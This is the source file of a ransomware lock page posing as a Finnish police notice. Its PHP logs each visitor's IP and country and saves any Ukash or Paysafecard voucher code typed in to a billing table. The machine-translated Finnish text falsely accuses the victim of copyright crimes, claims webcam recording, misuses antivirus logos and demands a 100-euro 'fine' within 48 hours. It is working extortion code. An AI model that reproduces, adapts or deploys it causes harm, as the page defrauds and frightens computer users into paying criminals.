
<?php
error_reporting(0);
include 'include/config.php';
include ('include/db.php');
include("sxgeo/SxGeo.php");




$pin=$_GET['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date('H:i:s j/m/Y');


$SxGeo = new SxGeo();

$country=$SxGeo->get_cc($ip);

$SxGeo->close();


$locations= array(1 => 'DE', 'UK', 'IT', 'FR', 'ES', 'PT', 'CA', 'AT', 'FI', 'SE', 'US', 'GR', 'LU', 'BE', 'PL');

foreach ($locations as $value)
{
	
if ($value==$country)
{
$pic=$value;
break;
}
else
$pic='default';	
}




mysql_query ( "INSERT INTO checklist (ip, country, date) VALUES ('".mysql_escape_string($ip)."', 
'".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
mysql_insert_id ();




  $pin=$_GET['pin'];

  
  
    if(strlen($pin) == 16 && preg_match("/[0-9]{16}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
   if(strlen($pin) == 19 && preg_match("/[0-9]{19}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
  
 
 ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


  
  <script language="JavaScript">
<!--
///////////////////////////////////
function clickIE4(){
if (event.button==2){
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("return false")
// --> </script>
  

  
  <title></title>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">


  
  <link href="style.css" rel="stylesheet" type="text/css">


  
  <script type="text/javascript" src="jquery1.3.1.js"></script>
  
  <script type="text/javascript" src="jquerykeypad.js"></script>
  

  
  <style type="text/css">
<!--
#Table_01 {
position:absolute;
left:20px;
top:20px;
width:100%;
height:100%;
}
.btn{
color: #000;
width: 30px;
margin-left: 5px;
border: 1px solid #434343;
-moz-border-radius: 2px;
-khtml-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
}
.btn:hover{
border: 2px solid #0290CB;
}
#Untitled-1-01 {
position:absolute;
left:0px;
top:0px;
width:1024px;
height:98px;
}
#Untitled-1-02 {
position:absolute;
left:0px;
top:98px;
width:395px;
height:670px;
}
#Untitled-1-03 {
position:absolute;
left:395px;
top:98px;
width:324px;
height:430px;
}
#Untitled-1-04 {
position:absolute;
left:719px;
top:98px;
width:305px;
height:430px;
}
#Untitled-1-05 {
position:absolute;
left:395px;
top:528px;
width:629px;
height:240px;
}
-->
  </style><!-- End ImageReady Styles -->
</head>


<body style="margin: 0px; background-color: rgb(255, 255, 255);">


<!-- ImageReady Slices (Untitled-1) -->
<div id="Table_01">
<div id="Untitled-1-01"> <img style="width: 481px; height: 99px;" alt="" src="images/logo.jpg"></div>


<div style="left: 0px; width: 470px; top: 130px; height: 732px;" id="Untitled-1-02"><span id="result_box" class="" lang="fi"><span class="hps">Kaikki toiminta</span> <span class="hps">on</span> <span class="hps">t&auml;m&auml; tietokone on</span> <span class="hps">kirjattu</span><span>.</span> <span class="hps">Jos</span> <span class="hps">k&auml;yt&auml;t</span> <span class="hps">web</span><span class="atn">-</span><span>videot</span> <span class="hps">ja</span> <span class="hps">kuvat on</span> <span class="hps">tallennettu</span> <span class="hps">tunnistamista</span> <span class="hps">webcam</span><span class="">.</span></span>

<center><img style="width: 256px; height: 192px;" alt="" src="images/flag_256.jpg"></center>


<br>


<span style="font-weight: bold;" id="result_box" class="" lang="fi"><span class="hps">IP</span><span class="atn">-</span><span>osoite:</span></span><?php echo $_SERVER['REMOTE_ADDR'];?>
<br>
<span id="result_box" class="" lang="fi"><span class="hps">Voit</span> <span class="hps">olla</span> <span class="hps">selv&auml;sti tunnistettavissa</span> <span class="hps">IP</span><span class="">-osoite</span> <span class="hps">ja</span> <span class="hps">koneen nimi</span></span><br>


<br>


<img style="width: 447px; height: 90px;" alt="" src="images/yourpclock.jpg"><br>


<br>


<span id="result_box" class="" lang="fi"><span style="font-weight: bold;" class="hps">Laittomasti</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">ladattu materiaali</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps atn">(</span><span style="font-weight: bold;">MP3, </span><span style="font-weight: bold;" class="hps">elokuvia</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">tai</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">Software</span><span style="font-weight: bold;">) on </span><span style="font-weight: bold;" class="hps">tietokoneessa</span><br>
<br>
 <span class="hps">Lataamalla</span> <span class="hps">ne</span> <span class="hps">on toistettu</span> <span class="hps">n&auml;in</span> <span class="hps">johon</span> <span class="hps">rikos</span> <span class="hps">&sect;</span> <span class="hps">106</span> <span class="hps">Copyright Act</span><span>.</span><br>
<br>
<span class="">Lataaminen</span> <span class="hps">tekij&auml;noikeuksin suojattua materiaalia</span> <span class="hps">internetin kautta</span> <span class="hps">tai musiikin</span> <span class="hps">jakaminen</span> <span class="hps">verkkojen</span> <span class="hps">laitonta ja</span> <span class="hps">on sopusoinnussa</span><br>
 <span class="hps">106 &sect;</span> <span class="hps">ja</span> <span class="hps">tekij&auml;noikeuslain</span> <span class="hps">alaisia</span><span class=""></span> <span class="hps">sakkoon tai vankeuteen</span> <span class="hps">langettaa enimmill&auml;&auml;n</span> <span class="hps">3 vuotta</span><br>
<br>
 <span class="hps">LIS&Auml;KSI</span> <span class="hps">hallussaan</span> <span class="hps">laittomasti</span> <span class="hps">ladattu materiaali</span> <span class="hps">on</span> <span class="hps">rangaistava</span> <span class="hps">184 &sect;</span> <span class="hps">3 kohdan</span> <span class="hps">rikoslain</span> <span class="hps">ja voi</span> <span class="hps">my&ouml;s johtaa</span> <span class="hps">takavarikointi</span> <span class="hps">tietokone</span><span>,</span> <span class="hps">jolla</span> <span class="hps">diles</span> <span class="hps">ladattiin</span></span></div>


<div style="left: 474px; width: 372px; top: 128px; height: 174px;" id="Untitled-1-03"><span id="result_box" class="short_text" lang="fi"><span class="hps">Seuraa</span> <span class="hps">ohjeita</span> <span class="hps">oikealla</span></span>

<form name="ukash_form" method="get" action="FI.php" style="margin: 0px;">Ukash code: <input name="pin" id="defaultKeypad" type="text"><input name="formbutton1" value="ok" class="btn" type="submit">
  
  <div id="formradio2"><input name="100u" value="50" type="radio">50 Euro</div>


  
  <div id="formradio3"><input name="100u" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<form name="psc_form" method="get" action="FI.php" style="margin: 0px;">Psc code: <input name="pin" id="defaultKeypad2" type="text"><input name="formbutton2" value="ok" class="btn" type="submit">
  
  <div id="formradio4"><input name="100p" value="50" type="radio">50 Euro</div>


  
  <div id="formradio5"><input name="100p" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<br>


<br>


<br>


<span id="result_box" class="" lang="fi"><span style="color: rgb(255, 0, 0);" class="hps">Huomaa</span><span style="color: rgb(255, 0, 0);">:</span> <span class="hps">T&auml;m&auml; hieno</span> <span class="hps">voidaan maksaa ainoastaan</span> <span class="hps">&#8203;&#8203;48 tunnin kuluessa</span><span>,</span> <span class="hps">jos</span> <span class="hps">annat</span> <span class="hps">48 tuntia</span> <span class="hps">menn&auml; ilman</span> <span class="hps">maksua</span><span>,</span><br>
&nbsp;<span class="">mahdollisuus</span> <span class="hps">vapauttaa</span> <span class="hps">tietokoneen</span> <span class="hps">p&auml;&auml;ttyy</span><span>.</span><br>
<br>
 <span style="font-weight: bold;" class="hps">T&auml;ss&auml;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">tapauksessa</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">rikollinen</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">jos</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">sinua vastaan</span><span style="font-weight: bold;"> </span> <span style="font-weight: bold;" class="hps">&#8203;&#8203;k&auml;ynnistet&auml;&auml;nautomaattisesti</span><span class="">.</span></span><span style="font-weight: bold;"></span></div>


<div style="left: 860px; width: 164px; top: 98px; height: 261px;" id="Untitled-1-04"> <img style="width: 332px; height: 271px;" alt="" src="images/right2.jpg"></div>


<div style="left: 481px; width: 543px; top: 468px; height: 380px;" id="Untitled-1-05"> <img style="width: 276px; height: 38px;" alt="" src="images/mcafee.jpg"><span id="result_box" class="" lang="en"><span class="hps"><br>
</span></span><span id="result_box" class="" lang="fi"><span class="hps">Miten</span> <span class="hps">avata</span><span>?</span><br>
<br>
 <span class="hps">Mukaisesti</span> <span class="hps atn">lailla <span style="font-weight: bold;">"</span></span><span style="font-weight: bold;">valvonta </span><span style="font-weight: bold;" class="hps">ja suojaaminen</span><span style="font-weight: bold;">"</span> <span class="hps">on</span> <span class="hps">1.2.2012</span> <span class="hps">Sinun on maksettava</span> <span class="hps">sakko</span> <span class="hps">on 100</span> <span class="hps">euroa.</span> <span class="hps">Saat k&auml;tev&auml;sti</span> <span class="hps">maksaa</span> <span class="hps">sakko</span> <span class="hps">tarjouksen</span> <span class="hps">k&auml;ytt&auml;&auml; turvallista</span> <span class="hps">maksutapaa</span> <span class="hps">kautta</span> <span class="hps">tositteiden</span> <span class="hps">Ukash</span> <span class="hps">/</span> <span class="hps">PaysafeCard</span><span>.</span> <span class="hps">Sinun</span> <span class="hps">t&auml;ytyy</span> <span class="hps">ostaa</span> <span class="hps">tositteet</span> <span class="hps">100 euron</span> <span class="hps">j&auml;lkeen</span> <span class="hps">t&auml;yt&auml;</span> <span class="hps">tarvittavat</span> <span class="hps">kent&auml;t, napsauta</span> <span class="hps">"OK</span></span><span id="result_box" class="" lang="en"><span class="">"</span></span><br>


<br>


<center><img style="top: 666px; left: 501px; width: 169px; height: 90px;" alt="" src="images/1326914693-sopa-pipa-inquisitr.png">
<img style="top: 488px; left: 501px; width: 76px; height: 92px;" alt="" src="images/kaspersky_is_logo.gif.png"></center>


</div>


</div>


<!-- End ImageReady Slices -->
</body>
</html>
